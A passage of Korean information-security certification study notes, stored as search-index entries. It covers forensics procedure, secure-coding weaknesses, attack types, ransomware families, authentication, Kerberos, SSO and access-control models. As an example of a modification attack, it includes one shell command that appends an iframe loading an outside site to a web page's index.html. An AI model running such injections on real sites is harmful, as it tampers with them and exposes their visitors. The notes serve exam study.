저장장치를 압수       시스템 시각 및 데이터 변조를 방지하기 위한 조치 필요 -&gt; 디스크 복제를 수행           비휘발성 데이터 수집 우선순위            Registry, 시간정보, Cache, Cookie, History, E-Mail       암호화된 파일, 윈도우 로그 등           4. 로드카르 법칙     개요            접촉하는 두 개체는 서로 흔적을 주고 받는다는 원칙       사용자든 조사자든 동작 중인 시스템을 다루게 되면 해당 시스템은 변화가 발생           로드카르(교환) 법칙으로 영향을 받는 데이터            프로세스 활동       데이터 저장 및 삭제       네트워크 상의 데이터 흐름       접속 사이트 Cache Data, 최근 접속목록 Update, 클라이언트 IP 및 Port, 방문URL, 시간 등           3. 디지털 포렌식 절차     준비            사전 정보수집, 네트워크 구성현황, 서버 등의 수집/이송에 필요인원       질문서, 영장, 사무실 용도 등을 개괄적으로 파악       운영체제, 데이터베이스, 네트워크, 시스템 등 분야별 전문가           획득            전원확인, 컴퓨터의 시간 차 확인, 휘발성 정보수집, 주변장치 확보, 관련자료 확보       압수물 라벨링 및 포장           이송            전자파 차폐용기, X-RAY 통과금지, 차량 이동 시 충격완화 장치 준비       증거물 보관실(클린 룸, 항온항습 장치 유지)에 보관           분석            원본 쓰기방지 장치 연결, 사본 복제, 복사본으로 분석       전문 분야별 포렌식 프로그램 활용, 분석과정을 명확하게 기록, 재현대비           증거분석서 작성            쉽고 평이하게 분석과정을 상세하게 기록       발견 증거물(삭제파일)의 경로기재 및 사진을 첨부           보관            전자파 차폐, 항온 항습장치 유치       봉인/봉인해제/재봉인 시 보관/분석 담당자 기록유지       사건 관계자 입회 하에 반출입 기록유지       CCTV 보관           개발보안(보안약점) (IT Compliance)  입력 데이터 검증 및 표현      SQL Injection   경로 조작 및 자원 삽입   XSS   운영체제 명령 삽입   위험한 형식 파일 업로드   CSRF   HTTP 분할 응답   메모리 버퍼 오버플로우   포맷 스트링 삽입   보안기능      취약한 암호화 알고리즘 사용   중요정보 평문 전송   하드코드 된 비밀번호   적절하지 않은 난수 값 사용   취약한 비밀번호 허용   솔트 없이 일방향 해시   시간 및 상태      경쟁조건   제어문을 사용하지 않는 재귀함수   에러처리      오류 메시지를 통한 정보 노출   오류상황 대응 부재   적절하지 않은 예외 처리   코드오류      Null 포인터 역참조   부적절한 자원 해제   해제된 자원 사용   초기화 되지 않은 변수 사용   캡슐화      잘못된 세션에 의한 데이터 정보 노출   제거되지 않고 남은 디버그 코드   시스템 데이터 정보 노출   Public 메소드부터 반환된 Private 배열 등   API 오용      DNS Lookup에 의존한 보안 결정   취약한 API 사용   ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","애플리케이션 보안","기타 애플리케이션 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-03Application-04Etc/",
        "teaser": null
      },{
        "title": "04.정보보안 일반 - 01.보안 요소 기술",
        "excerpt":"정보보호 개요  1. 정보보호 목표     기밀성(Confidentiality)            정보가 허가되지 않은 사용자(조직)에게 노출되지 않는 것을 보장       허가되지 않은 접근/유출 시 내용을 알 수 없도록 암호화       중요자료에 대해 보안등급 부여, 접근 제어           무결성(Integrity)            정보가 권한이 없는 사용자의 악의적 또는 비악의적 접근에 의해 변경되지 않는 것을 보장       중요정보가 변경되면 변경된 사실을 알 수 있게 하는 것       해시함수(Hash Function)           가용성(Availability)            인가된 사용자(조직)가 정보시스템의 데이터 또는 자원을 필요로 할 때 원하는 객체 또는 자원에 접근하고 사용할 수 있는 것을 보장       시스템 이중화, RAID, DRS           2. 정보보호 공격유형과 보호대책     변조(Modification)            원래의 데이터를 조작하는 행위       예: echo \"&lt;iframe src=http://www.abc.com&gt;&lt;/iframe&gt;\" &gt;&gt; index.html &gt; index.html 파일에 iframe 구문의 스크립트 추가           가로채기(Interception)            네트워크상 전송되는 데이터에 대해 복사, 열람 등을 하는 공격       수동적 공격(Passive Attack)       스니핑(Sniffing) : 전송되는 데이터를 모니터링       Web Proxy 를 사용한 사용자 ID, 패스워드 가로채기           차단(Interruption)            정상적인 서비스를 방해하는 행위       DoS, 프로세스 고갈 공격       가용성 보장을 위협하는 공격       사이버 대피소 : 한국인터넷진흥원의 DoS 공격 트래픽을 우회시켜주는 중소기업 무료지원 서비스           위조(Fabrication)            송신되는 메시지를 변조하여 상대방을 속이는 것           3. 정보보호 대책  1. 일반통제와 응용통제     일반통제 : 소프트웨어 생명주기에 대한 통제, IT조직, 직무분리, 시스템개발, 논리적 및 물리적 보안, 하드웨어 통제, 백업 및 복구, 비상계획수립   응용통제 : 트랜잭션(Transaction)과 데이터 무결성을 확보하기 위한 통제, 트랜잭션을 처리하기 위한 입력, 처리, 출력을 통제, 무결성 확보   2. 통제의 시점별 분류     예방통제            능동적인 통제로 발생가능한 문제점을 사전에 식별하여 통제를 수행       물리적 접근 통제 : 승인되지 않은 사람이 주요 정보시스템에 출입할 수 없도록 하는 것       논리적 접근 통제 : 인증받지 못한 사람이 정보시스템에 접근할 수 없게 함           탐지통제            위협을 탐지하는 통제           교정통제            탐지된 위협과 취약점에 대응, 위협과 취약점을 감소시킴           3. 통제 수행시점에 따른 분류                  통제 유형       설명       사례                       예방(Preventive)       바람직하지 못한 사건이 발생하는 것을 피하기 위해 사용되는 통제       담장, 자물쇠, 보안 경비원, 백신, 직무분리, 암호화, 방화벽                 탐지(Detective)       발생한 사건을 식별하기 위해 사용       CCTV, 보안 감사, 감사로그, 침입탐지, 경보                 교정(Corrective)       발생한 사건을 교정하기 위해 사용       백신 소프트웨어                 복구(Recovery)       자원과 능력을 복구하기 위해 사용       백업과 복구           4. 랜섬웨어(Ransomware)     개요            ransom(몸값)과 ware(제품)의 합성어       암호화 기법을 사용해서 피해자의 문서, 이미지, 동영상 등을 암호화       금품을 요구           종류            록키(Locky)                    자바 스크립트 파일이 들어있는 압축파일들을 첨부           실행 시 감염, 파일이 암호화되고 확장자가 .locky로 변경됨                       크립트XXX(CryptXXX)                    감염되면 파일 확장자가 .crypt 등으로 변경, 비트코인 지불 안내서를 제공           악성코드는 DLL 형태로 배포되면서 감염됨                       케르베르(CERBER)                    취약한 웹 사이트 방문으로 감염되며 파일을 암호화하고 확장자가 .cerber로 변경됨           윈도우의 볼륨 셰도우(Volume Shadow)를 삭제하여 윈도우를 복구 불가능하게 함                       워너크라이(WannaCry)                    SMB(Server Message Block) 취약점을 이용하여 전파되는 것           파일 암호화 이후 금품을 요구           대응하기 위해 SMB 프로토콜은 UDP 137,138 포트와 TCP 139,445를 차단해야 함                       페티야(Petya)                    공격자는 Office 파일에 랜섬웨어 코드를 삽입하고 피해자에게 메일을 발송           피해자는 메일의 첨부파일을 클릭           페티야는 감염 PC를 재부팅하고 하드디스크의 MFT(Master File Table)을 암호화           MBR(Master Boot Record)을 파괴           공격자는 300$의 비트코인을 요구함                       이터널블루                    NSA가 만든 익스플로잇으로 볼티모어 랜섬웨어 사건과 연관           윈도우 XP, Vista 에 존재하는 취약점을 익스플로잇           WannaCry, NotPetya           SMB(Server Message Block)                           사용자 인증 방식 및 원리  1. 지식기반 인증      사용자의 기억으로만 인증하는 방식   패스워드, Pin 번호 등   1. 패스워드     패스워드(Password)의 문제점            많이 사용되는 인증 방식, 인증 요소 중 가장 안전하지 않음       주기적으로 보안인식에 대한 교육이 필요       암호화하지 않으면 스니핑 툴로 도청이 가능           패스워드(Password) 정책            최소 8문자 이상으로 조합하여 구성(대소문자, 숫자, 특수문자)       책임 추적성 성립이 어렵기 때문에 공유되어서는 안 된다.       신규 사용자를 생성한 후 처음 로그인 시 반드시 새로운 패스워드를 변경하도록 강제 적용       로그인 정보(날짜, 시간, 사용자 ID, OS)에 대해 정확한 감사기록이 유지되어야 함       시스템은 실패한 로그인 횟수를 제한하도록 임계치(Clipping level)를 설정       마지막 로그인 시간을 보여줌       휴면 계정은 사용 불가/삭제, Password는 저장소에 One-way 암호화를 수행                패스워드 공격 기법                                  공격 기법           내용                                           무차별 공격           Brute Force Attack, 임의의 값을 반복적으로 입력하여 패스워드를 크랙 (John the Ripper, hydra)                             사전 공격           Dictionary Attack, 사전의 용어를 반복적으로 입력하여 패스워드를 크랙                             트로이목마 프로그램           정상적인 프로그램으로 가장한 정보 유출                             사회 공학적 공격           심리적 공격 방법(예:콜 센터 등에 전화하여 패스워드를 알아냄)                             전자적 모니터링           패스워드 입력 시 또는 전송 시에 sniffing 하여 훔침(해결책: OTP 사용)                           2. 악성코드(Malicious Software) 종류     논리폭탄(Logic Bomb) : 특정 조건이 발생할 때 실행되는 악성코드, 특정 조건이 발생하지 않으면 악성코드로 기동되지 않기 때문에 탐지가 어려움   키로거(Key-Logger) : 사용자가 입력하는 정보를 갈취하는 악성코드, 윈도우 후킹(Hooking)을 통해서 키보드 입력정보를 획득   트로이목마(Trojan Horse) : 자가복제 능력이 없으며 시스템 정보, 개인정보 등을 유출하거나 특정 시스템 파일을 삭제   백도어(Backdoor, Trapdoor) : 인증과정을 우회해서 시스템에 접근할 수 있도록 열어둔 뒷문으로 원격조정을 통해서 시스템을 장악할 수 있도록 함   루트킷(Rootkit) : 공격자가 루트권한 획득을 위해서 심은 악성코드   2. 소유기반 인증(Type II 인증, Something you have)     개념            가장 대표적인 예는 열쇠       소유기반 인증은 복제와 분실의 문제점을 가짐       스마트 카드, OTP(One Time Password)           스마트 카드            마이크로프로세스 칩과 메모리를 내장한 일종의 소형컴퓨터, 높은 보안성 요구       메모리 토큰과 달리 프로세스 능력을 가짐       Global Standard 부족(통일성 결여) : 어떤 정보가 어떻게 저장되는지에 대한 표준이 미흡       취약점 : 부 채널 공격                    카드가 가동될 때 발생하는 온도, 전파를 이용           무선 주파수를 복제하여 전파를 보내면 카드가 작동함                                스마트 카드의 구성요소                                  구성요소           내용                                           CPU(Microprocessor)           산술 및 사칙연산, 논리연산을 수행하는 연산 장치                             ROM           운영체제(Chip OS) 탑재, 보안 알고리즘(3DES), 카드 제작 시 저장하고 변경이 불가능함                             RAM           임시 데이터 저장용(4KByte 이상)                             EEPROM           파일 시스템, 프로그램 및 응용 프로그램 키, 비밀번호, 카드 발급 시 저장                             I/O 시스템           접촉식과 비접촉식, 2가지 동시 지원 콤비형                           3. 존재(생체)기반 인증(Type III, Something you are)     생체인증(Biometrics)            개념                    평생 불변의 특성을 지닌 생체적, 행동적 특징을 자동화된 수단으로 등록, 사용자가 제시한 정보와 패턴을 비교(검증)한 후 인증하는 기술           물리적 접근 통제에서 식별되어 사용될 수 있음                                생체인증 분류                                                  분류               내용                                                               존재 특징(Type III)               생체특성, 지문, 장문, 얼굴, 손 모양, 홍채, 망막, 정맥                                         행동 특징(Type IV)               서명, 음성, 키보드 입력                                                        생체인증 특징                                                  평가항목               내용                                                               보편성(University)               모든 사람들이 보편적으로 지니고 있어야 함                                         유일성(Uniqueness)               개인별로 특징이 명확히 구분 되어야 함                                         지속성(Permanence)               개인의 생체 정보는 지속적이어야 함                                         성능(Performance)               개인 확인 및 인식의 우수성, 시스템 성능                                         수용성(Acceptance)               거부감이 없어야 함                                         저항성(Resistance)               위조 가능성이 없어야 함                                                   생체인증 도구의 효과성과 사회적 수용성            효과성: 손바닥&gt;손&gt;홍채&gt;망막&gt;지문&gt;목소리       수용성: 홍채&gt;키 누름 동작&gt;서명&gt;목소리&gt;얼굴&gt;지문&gt;손바닥&gt;손&gt;망막                생체인증 평가항목              이미지 출처              FRR(False Reject Rate, Type I Error) : 잘못된 거부율(오거부율), 편의성 관점, 정상적인 사람을 거부함       FAR(False Acceptance Rate, Type II Error) : 잘못된 승인율(오인식율), 보안관점, 비인가자를 정상인으로 받아들임       CER(Crossover Error Rate), ERR(Equal Error Rate) : FRR와 FAR가 cross 되는 지점, 효율성 및 생체인증의 척도           4. 행동기반 인증     개인의 고유한 행동적 특성을 사용해서 인증, 생체인식 기술의 하나   서명, 키스트로크(Keystroke), 마우스 움직임, 걸음걸이, 모바일 단말기 사용패턴        행위정보를 평상시에 축적하여 프로파일 정보를 구축해야 함                                  종류           장점           단점                                           음성인식(Voice)           원격지 사용 가능, 가격 저렴           신체적, 감정적 변화에 민감                             서명(Signature)           입력기기 가격 저렴, 편의성 좋음           타인이 사용할 가능성 존재, 정확도 떨어짐                             키보드 입력(Keystroke Dynamic)           키 누름 도작           패스워드 노출 위험성이 높아 공격자의 주된 공격 대상이 될 수 있음                           5. 커버로스(Kerberos) 인증  1. 커버로스(Kerberos) 인증     중앙 집중형 사용자 인증 프로토콜 / RFC1510   대칭키 암호화 기법에 바탕을 둔 티켓기반 인증 프로토콜   3A 지원 : Authentication(인증), Authorization(인가), Accounting(과금)(AAA 서버라고도 함)   2. 커버로스의 구성요소                  구성요소       설명                       KDC       키 분배센터(Key Distribution Center), TGS + AS로 구성 사용자와 서비스 암호화 키(비밀키)를 유지하고 인증 서비스를 제공하며 세션 키를 만들고 분배                 AS       인증 서비스(Authentication Service), 실질적 인증 수행                 Principals       인증을 위하여 커버로스 프로토콜을 사용하는 모든 실제를 이르는 말                 TGS       티켓 부여 서비스(Ticket Granting Service) 티켓을 만들고 세션 키를 포함한 Principals에 티켓을 분배하는 KDC의 한 부분                 Ticket       인증 토큰              TimeStamp : 시간제한을 두어 다른 사람이 티켓을 복사하여 나중에 그 사용자인 것처럼 위장하여 티켓을 사용하는 것을 막음 (Replay 공격 예방)   3. 커버로스 인증의 동작 원리      이미지 출처      절차            사용자는 인증 서비스에 인증을 한다.       인증 서비스는 사용자에게 시작 티켓을 전송한다(사용자 이름, 발급시간, 유효시간).       사용자는 서비스 접근 요청을 한다.       TGS는 세션 키가 포함된 새로운 티켓을 만든다.       사용자는 하나의 세션 키를 추출하고 티켓을 파일서버로 전송한다.       티켓을 받은 서버는 사용자에 대한 서비스 제공 여부를 결정한다.           SSO(Single Sign On)  1. SSO 개요     다수의 서비스를 한 번의 Login으로 기업의 업무 시스템이나 인터넷 서비스에 접속할 수 있게 해 주는 보안시스템   중앙집중형 접근 관리, 보안 기능 PKI(Public key Infrastructure), 암호화 기능   장점 : 보안성 우수, 사용자 편의성 증가, 패스워드 분실에 따른 관리자의 부담 감소   단점 : SPOF(Single Point Of Failure)   2. SSO 통합인증      이미지 출처   3. SSO 종류                  종류       상세 내용                       Delegation 방식       대상 애플리케이션의 인증 방식을 변경하기 어려울 때 많이 사용. 대상 애플리케이션의 인증 방식을 전혀 변경하지 않고, 사용자의 대상 애플리케이션 인증 정보를 에이전트가 관리해 사용자 대신 로그온해 주는 방식                 Propagation 방식       통합인증을 수행하는 곳에서 인증을 받아 대상 애플리케이션으로 전달할 토큰을 발급받음. 대상 애플리케이션에 사용자가 접근할 때 토큰을 자동으로 전달해 대상 애플리케이션이 사용자를 확인할 수 있도록 하는 방식. 웹 환경에서 쿠키라는 기술을 이용해 토큰을 자동으로 대상 애플리케이션에 전달할 수도 있음. 이러한 웹 환경의 이점으로 웹 환경에서의 SSO는 대부분 이 모델을 채택함.                 Delegation &amp; Propagation 방식       웹 애플리케이션의 변경이 불가능하고 사용자 통합이 어려운 경우 Delegation 방식을 활용. 또한 대상 애플리케이션이 많고 특성들이 다양한 경우 각 애플리케이션에 Delegation 방식과 Propagtaion 방식을 혼용해서 전체 시스템의 SSO를 구성함.                 Web 기반 One Cookie Domain SSO       SSO 대상 서비스와 애플리케이션들이 하나의 Cookie Domain 안에 존재할 때 사용. 일반적인 기업 내부의 컴퓨팅 환경. 통합인증을 받은 사용자는 토큰을 발급받고, 이 토큰은 Cookie Domain에 Cookie로 설정되어 Cookie Domain 내의 다른 서비스로 접근할 때 자동으로 토큰을 서비스에 제공함. 서비스에서 동작하는 SSO 에이전트는 토큰으로부터 사용자 신원을 확인하고 요청된 자원에 대한 접근을 허가함.          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안 일반","보안 요소 기술"],
        "url": "https://bluesplatter.com/is_certification/ISCert-04IS-01Principle/",
        "teaser": null
      },{
        "title": "04.정보보안 일반 - 02.접근 통제",
        "excerpt":"접근 통제(Access Control) 정책의 이해 및 구성요소  1. 개요 (용어)     정당한 사용자에게는 권한을 부여하고 그 외의 다른 사용자는 거부하는 것   식별(Identification) : 사용자 ID를 확인하는 과정   인증(Authentication) : 패스워드가 정확한지 확인   인가(Authorization) : 읽고, 쓰고, 실행시키는 권한을 부여   주체 : 자원의 접근을 요구하는 활동 개체(사람, 프로그램, 프로세스 등)   객체 : 자원을 가진 수동적인 개체(Database, 컴퓨터, 파일 등)   접근 : 주체와 객체의 정보 흐름   2. 정보 접근의 단계                  단계       내용                       식별(Identification) 단계       사용자가 시스템에 본인이 누구라는 것을 밝히는 행위(예: ID)                 인증(Authentication) 단계       사용자가 맞음을 시스템이 인정(예: Password, 스마트카드, 생체인증)                 인가(Authorization) 단계       접근 권한 유무 판별 후 접근 권한 부여           3. 접근 통제 정의     접근 통제(Access Control)는 주체에 대한 객체의 접근을 통제   A 라는 사용자가 b.html 파일객체에 대해 읽기, 쓰기, 실행 권한이 있는지 확인하고 권한이 있으면 권한을 부여   권한이 없으면 접근을 차단   통제 활동 : 비인가된 접근 감시, 접근을 요구하는 이용자를 식별, 정당한 이용인지 확인   통제 목적 : 주체의 접근으로부터 객체의 기밀성, 무결성, 가용성을 보장   4. 접근 통제 원칙     최소 권한의 원칙 : 최소한의 권한만을 허용하여 권한의 남용을 방지   직무분리 : 업무의 발생, 승인, 변경, 확인, 배포 등이 한 사람에 의해 처리되지 않도록 직무를 분리 (예: 보안관리자와 감사자, 개발자와 운영자)   5. 참조 모니터(Reference Monitor)     개요            주체가 객체를 참조할 때 직접참조를 수행하지 않고 보안 커널을 통해 참조       보안 커널은 주체의 권한을 확인하고 접근한 객체에 대한 정보를 로그에 기록       취약점은 보안 커널을 통해 차단       주체의 객체에 대한 접근 통제 결정을 중재하는 OS의 보안 커널로서 일련의 소프트웨어임                참조 모니터의 3가지 요소                                  요소           내용                                           완전성(Completeness)           우회가 불가능해야 함                             격리(Isolation)           Tamper proof(부정 조작이 불가능해야 함)                             검증성(Verifiability)           분석하고 테스트할 정도로 충분히 작아야 함(Simple, Small, Understandable)                           6. 식별과 인증     식별 : 자신을 시스템에 밝히는 수단, Unique, 책임 추적성 분석의 기초   인증 : 시스템이 사용자가 맞음을 검증하고 인정하는 것   7. 인증 방식에 따른 분류                  인증 구분       설명       기반       종류                       Type I 인증       Something you know       지식       Password, Pin, Passphrase                 Type II 인증       Something you have       소유       Smart Card, Tokens                 Type III 인증       Something you are       존재       홍채, 지문, 정맥                 Type IV 인증       Something you do       행동       음성, 서명, Keystroke Dynamics              2-Factor 인증            지식, 소유, 존재, 행동기반 인증에서 2개를 같이 인증하는 방법           접근 통제 기술 정책의 특징 및 적용 범위  1. 접근 통제 기술 개요     미국 국방성에서 기밀 분류 방법으로부터 유래하는 접근 통제 정책            MAC(Mandatory Access Control)                    자동으로 시행되는 어떤 규칙에 기반           사용자와 타깃에 광범위한 그룹 형성이 요구됨                       DAC(Discretionary Access Control)                    특별한 사용자별로 정보에 대한 접근을 제공           추가적 접근 통제를 사용자에게 일임                           OSI 보안 구조            신분기반(Identity-based) : DAC 와 유사                    개인기반(Individual-Based Policy:IBP)           그룹기반(Group-Based Policy:GBP)                       규칙기반(Rule-based) : MAC 와 유사                    다중단계(Multi-Level Policy:MLP)           부서기반(Compartment-Based Policy:CBP)                       직무기반(Role-Based)                    신분기반과 규칙기반 정책의 양쪽 특성                           접근 통제 메커니즘            ACL(Access Control List)       CL(Capability List)       SL(Security Label)       통합정보 메커니즘 (3가지 정보를 종합적 고려)       PB(Protection Bit) : 각 파일에 접근 통제를 위한 Bit 부여           접근 통제 보안모델            HRU 접근행렬 모델 : 접근행렬 이용       BLP 보안모델 : 엄격한 기밀성 통제       Biba 보안모델 : 무결성 정책을 지원       Clark-Wilson 모델 : 실행할 수 있는 프로그램에 의하여 통제           2. MAC(Mandatory Access Control)     MAC(Mandatory Access Control) - 강제적 접근 통제            접근 권한이 주체의 비밀 취급 인가 레이블 및 객체의 민감도 레이블에 따라 지정되는 방식       관리자에 의해서 권한이 할당되고 해제됨           MAC의 주요 특징            데이터에대한 접근을 시스템이 결정(Rule에 의해)       관리자만이 자원의 카테고리 변경 가능       비밀성을 포함하고 있는 객체에 대해 주체가 가지고 있는 권한에 근거하여 객체의 접근을 제한하는 정책                MAC의 종류                                  종류           설명                                           Rule-based MAC           주체와 객체의 특성에 관계된 특정 규칙에 따른 접근 통제 방화벽                             Administratively-directed MAC           객체에 접근할 수 있는 시스템 관리자에 의한 통제                             CBP(Compartment-Based Policy)           ⦁ 일련의 객체 집합을 다른 객체들과 분리 ⦁ 동일 수준의 접근허가를 갖는 부서라도 다른 보안등급을 가질 수 있음 ⦁ 예)팀장은 자기 팀원의 급여정보를 볼 수 있으나 다른 팀원 급여정보는 볼 수 없음                             MLP(Multi-Level Policy)           ⦁ Top Secret, Secret, Confidentiality, Unclassified와 같이 각 객체별로 지정된 허용 등급을 할당하여 운영 ⦁ 미국 국방성 컴퓨터 보안 평가지표에 사용, BLP 수학적 모델로 표현 가능 ⦁ 일종의 다단계 접근 통제방법 ⦁ 주체와 객체에 대하여 접근 권한에 대한 보안등급이나 역할에 따른 보호번주 등의 보안 레이블을 부여하여 접근을 통제하는 방법                           3. DAC(Discretionary Access Control)     DAC(Discretionary Access Control) - 자율적 접근 통제            객체의 소유자가 권한 부여 : 접근하려는 사용자에 대하여 권한을 추가 및 삭제할 수 있다.       User-based, Identity : 사용자의 신분에 따라 임의로 접근을 제어하는 방식       융통성이 좋아 UNIX, DBMS 등의 상용 OS에서 구현이 가능       접근 통제 목록(ACL, Access Control List) 사용 : Read, Write, Execute       MAC의 단점을 극복하기 위해 나온 것이 아님           DAC 종류            Identity-based DAC : 주체와 객체의 ID에 따른 접근 통제, 주로 유닉스에서 사용       User-directed : 객체 소유자가 접근 권한을 설정 및 변경할 수 있는 방식           Non-DAC(Non Discretionary Access Control) - 비임의적 접근 통제            주체의 역할에 따라 접근할 수 있는 객체를 지정하는 방식       기업 내 개인의 작은 이동(예:직무순환) 및 조직 특성에 밀접하게 적용하기 위한 통제 방식       Role-based 또는 Task-based 라고도 함       Central authority(중앙 인증) : 중앙 관리자에 의해 접근 규칙을 지정       사용자별 접근 통제 규칙을 설정할 필요가 없다.                Non-DAC의 종류                                  종류           설명                                           Role-based Access Control(RBAC)           ⦁ 사용자의 역할(임무)에 의해 권한이 부여(예:PM, 개발자, 디자이너) ⦁ 사용자가 적절한 역할에 할당되고 역할에 적합한 권한이 할당된 경우만 사용자가 특정한 모드로 정보에 대한 접근을 통제할 수 있는 방법                             Lattice-based Non-DAC           ⦁ 역할에 할당된 민감도 레벨에 의해 결정 ⦁ 관련된 정보로만 접근 가능(예: 핵무기 임수 수행자는 관련된 상/하위 정보로만 접근 가능) ⦁ 주체와 객체의 관계에 의거하여 접근을 통제할 수 있는 Upper bound와 Low bound를 설정하여 제어하는 방식, 정보의 흐름을 통제                             Task-based Non-DAC           ⦁ 조직 내 개인의 임무에 의한 접근 통제(알 필요성의 원칙) ⦁ 핵무기와 관련된 임무를 수행하고 있는 경우 다른 관련 업무는 볼 수 없음                           4. RBAC(Role Base Access Control)     권한들의 묶음으로 Role을 만들어서 사용자에게 Role 단위로 권한을 할당하고 관리   RBAC의 장점            관리 수월 : 관리자에게 편리한 관리 능력을 제공, 비용이 줄어듦       보안관리 단순화 : 권한 지정을 논리적, 독립적으로 할당하거나 회수 가능       최소 권한 : 최소한의 권한만을 허용하여 권한의 남용을 방지       직무분리 : 시스템상에서 오용을 일으킬 정도로 충분한 특권을 가진 사용자를 없게 한다는 것이 가장 큰 특징임           5. 접근 통제 기술 간의 차이점                  항목       MAC       DAC       RBAC                       권한 부여자       System       Data Owner       Central Authority                 접근 여부 결정 기준       Security Label       Identity       Role                 오렌지북       B       C       C                 장점       안전/중앙 집중관리       유연, 구현 용이       관리 용이                 단점       구현/운영 어려움, 높은 비용       트로이목마 공격에 취약, ID 도용문제       사용자-역할 중심이기 때문에 접근 요청이 발생하는 상황 정보 등이 접근 제어 정책에 제대로 반영되기 어려움                 적용 사례       방화벽       Linux 파일시스템       HIPAA(보건 보험)           접근 통제 기법과 각 모델의 특징  1. 접근 통제 방법      이미지 출처      Capability List            주체별로 객체를 링크드리스트로 연결하고 권한을 할당한 구조       A 에 대해 모든 파일을 리스트하고 파일별 접근권한을 나열한 구조       권한을 알기 위한 탐색시간이 오래 걸리는 문제점           Access Control List            주체와 객체간의 접근 권한을 테이블로 구성한 것       행에는 주체, 열에는 객체를 두고 행과 열의 교차점에는 주체가 객체에 대한 접근 권한(W, R, D, E)을 기술하여 이름 기반으로 제어       사용자가 비교적 소수, 분포도가 안정적일 때 적합 (지속적 변경환경에서는 부적합)           2. 접근 통제 매트릭스 종류     ACL(Access Control List) : 객체 기반 접근 제어            객체 관점에서 접근 권한을 테이블 형태로 기술하여 접근 제어       사용자가 비교적 소수, 분포도가 안정적일 때 적합 (지속적 변경환경에서는 부적합)           내용 의존 접근 통제(Content Dependent Access Control)            데이터베이스에서 가장 많이 사용, 접근제어가 내용에 의해 이루어짐       예) DB File에서 직원의 경력, 인사 등의 내용이 있을 때 일반 직원은 자신의 것만 볼 수 있지만 팀장의 경우 팀의 모든 직원을 볼 수 있게 하는 방식           제한적 인터페이스(Restricted Interfaces, Constricted User Interface)            특정 기능이나 자원에 대한 접근 권한이 없을 경우 아예 접근을 요청하지 못하도록 하는 것       예) DB View           3. 접근 통제 모델(Access Control Model)  1. Bell-Lapadula 모델     개념            기밀성 모델로서 높은 등급의 정보가 낮은 레벨로 유출되는 것을 통제하는 모델       정보구분 : Top Secret, Secret, Unclassified       최초의 수학적 모델로서 보안 등급과 범주를 이용한 강제적 정책에 의한 접근 통제 모델       미 국방성(DOD)의 지원을 받아 설계된 모델로서 오렌지북인 TCSEC의 근간이 됨       시스템의 비밀성을 보호하기 위한 보안 정책           No Read-Up(NRU or ss-property) : 단순 보안 규칙            주체는 자신보다 높은 등급의 객체를 읽을 수 없다       주체의 취급인가가 객체의 비밀 등급보다 같거나 높아야 그 객체를 읽을 수 있다.           No Write-Down(NWD or *-property) = Confinement property : *(스타-보안규칙)            주체는 자신보다 낮은 등급의 객체에 정보를 쓸 수 없다.       주체의 취급인가가 객체의 비밀 등급보다 낮거나 같을 경우 그 객체를 주체가 기록할 수 있다.           Strong *-property            더욱 강화한 모델로, 주체는 자신과 등급이 다른 객체에 대해 읽거나 쓸 수 없다.                단계 등급별 구분                                  Level           ss-property 읽기 권한(Read Access)           *-property 쓰기 권한(Write Access)           Strong*-property 읽기/쓰기(Read/Write Access)                                           높은 등급           통제           가능(OK Write Up)           통제                             같은 등급           가능           가능           가능                             낮은 등급           가능(OK Read Down)           통제           통제                           2. Biba 모델     개념            Bell-Lapadula 모델의 단점인 무결성을 보장할 수 있는 모델       주체에 의한 객체 접근의 하목으로 무결성을 다룸           Biba 모델의 속성            No Read Down(NRD or Simple Integrity Axiom)       No Write Up(NWU or *Integrity Axiom)                단계 등급별 구분                                  Level           단순 무결성 규칙 (Simple Integrity Property) 읽기 권한(Read Access)           (스타) - 무결성 규칙 (Integrity *-property) 쓰기 권한(Write Access)                                           높은 등급           가능(OK Read Up)           통제                             같은 등급           가능           가능                             낮은 등급           통제           가능(OK Write Down)                           3. Clark and Wilson(클락윌슨 모델)     클락 윌슨(Clark and Wilson)            무결성 중심의 상업용으로 설계한 것으로 Application의 보안 요구사항을 다룸       정보의 특성에 따라 비밀 노출 방지보다 자료의 변조 방지가 더 중요한 경우가 있음을 기초로 함       주체와 객체 사이에 프로그램이 존재, 객체는 항상 프로그램을 통해서만 접근이 가능       2가지 무결성을 정의 : 내부 일관성(시스템 이용), 외부 일관성(감사에 활용)           만리장성 모델(Chinese Wall = Brewer-Nash)            서로 상충 관계에 있는 객체 간의 정보 접근을 통제하는 모델(이익의 상충 금지)이다.       상업적으로 기밀성 정책에 따른다.           보안 운영체제(Secure OS)     보안 운영체제(Secure OS)            기존의 운영체제에서 발생 가능한 보안 취약성으로부터 시스템 자체를 보호하기 위해 기존 운영체제의 커널 등급에 부가적인 보안 기능을 강화시킨 운영체제           1. Secure DBMS 구조                  구조       설명                       신뢰 필터 구조       ⦁ 신뢰할 수 없는 전위 사용자 인터페이스와 후위 데이터베이스 사이에 신뢰 필터를 사용하여 데이터에 대한 접근 통제 및 보안 서비스를 제공 ⦁ 신뢰 필터는 하부의 보안 운영체제가 제공하는 보안 서비스 및 메커니즘에 의존 ⦁ 장점 : 다른 구조에 비해 간단하며 작기 때문에 보안 기능의 검증 및 평가에 용이 ⦁ 단점 : 데이터의 보안을 침해하는 일부의 위협에 대해서는 취약점을 지님                 커널 구조       ⦁ 커널 구조는 TCB 분할 개념에 의해서 구현됨. 따라서 데이터베이스 시스템은 보안 커널 외부에 존재하면서 임의적으로 보안만을 관리 ⦁ 데이터베이스 객체에 대한 임의적 접근 통제 : DBMS에 의해 수행 ⦁ 데이터베이스 파일에 대한 임의적 접근 통제 및 모든 강제적 접근 통제 : 하부의 보안 운영체제에 의하여 제공                 이중 커널 구조       강제적 보안 기능을 갖는 데이터베이스 시스템을 구현하고, 이를 보안 운영체제와 함께 시스템의 TCB로 간주하여 보안 시스템을 평가                 중복 구조       낮은 보호 수준의 데이터를 데이터베이스에 중복하여 저장하는 방식           2. 은닉채널(Convert Channel)     기본 통신채널에 기생하는 통신채널로서 은닉메시지를 송신자와 수신자만 확인할 수 있다. 그 이유는 메시지가 스테가노그래피로 숨겨져 있어서 다른 사용자는 확인할 수 없기 때문이다.   키 분배 프로토콜  1. 대칭키 암호화(Symmetric Key)     대칭키 암호화 기법            암호화 키와 복호화 키가 동일한 암호화 방식으로, 양방향 암호화 기법이다.       암호문을 송신하거나 수신하는 사용자는 사전에 암호화키를 교환해야 한다.       Session Key, Shared Key, Secret 